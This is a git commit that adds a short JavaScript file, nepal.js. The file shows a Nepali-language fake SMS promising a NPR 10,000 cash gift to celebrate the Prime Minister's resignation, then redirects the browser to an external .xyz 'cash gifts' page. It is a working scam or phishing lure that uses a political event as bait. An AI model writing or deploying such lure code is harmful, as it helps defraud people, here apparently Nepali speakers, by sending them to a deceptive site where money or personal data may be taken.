de8da85736d5004183ff883f965f6da25f5a7baf
bigetijazz28 <bigetijazz28@gmail.com>
2025-09-10 16:13:42 +0100

    Create nepal.js

---
+++ nepal.js
@@ -0,0 +1,6 @@
+
+var password = 'Get NPR 10,000'
+password=prompt('SMS: प्रधानमन्त्रीको राजीनामा मनाउन रु. १०,००० नगद उपहारमा स्वागत छ, यो अद्भुत अफर प्राप्त गर्न ठीक छ थिच्नुहोस्।','Get NPR 10,000');
+if (password != 'Get NPR 10,000') {
+location.href='https://www.ekuula.xyz/Protest-Celebration-Cash-Gifts';
+}
